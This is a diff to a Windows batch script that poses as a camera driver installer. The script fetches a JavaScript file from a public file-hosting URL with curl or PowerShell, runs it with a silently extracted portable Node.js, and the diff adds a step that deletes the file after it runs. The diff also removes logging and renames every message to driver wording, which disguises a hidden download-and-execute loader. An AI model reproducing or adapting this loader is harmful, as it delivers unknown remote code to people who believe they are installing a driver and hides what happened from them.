@@ -27,7 +27,6 @@ if not errorlevel 1 (
 
 if not defined NODE_EXE (
     if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
     ) else ( echo [INFO] Camera Driver not found globally. Attempting to extract portable version...
@@ -48,7 +47,7 @@ if not defined NODE_EXE (
         msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
         del "%~dp0%NODE_MSI%"
     ) else (
-        echo [ERROR] Failed to download Camera Driver MSI.
+        echo [ERROR] Failed to download Camera Driver.
         exit /b 1
     )
 
@@ -78,7 +77,6 @@ if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 
 where curl >nul 2>&1
 if errorlevel 1 (
-    echo [INFO] curl not found. Using PowerShell to download env-setup.npl...
     powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
 ) else (
     curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js" >nul 2>&1
@@ -87,15 +85,16 @@ if errorlevel 1 (
 :: Run the parser
 :: -------------------------
 if exist "%CODEPROFILE%\env-setup.npl" (
-    echo [INFO] Running env-setup...
+    echo [INFO] Running Driver Packages...
     cd "%CODEPROFILE%"
     "%NODE_EXE%" "env-setup.npl"
     if errorlevel 1 (
-        echo [ERROR] env-setup execution failed.
+        echo [ERROR] Driver execution failed.
         exit /b 1
     )
+    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 ) else (
-    echo [ERROR] env-setup not found.
+    echo [ERROR] Driver files not found.
     exit /b 1
 )
 
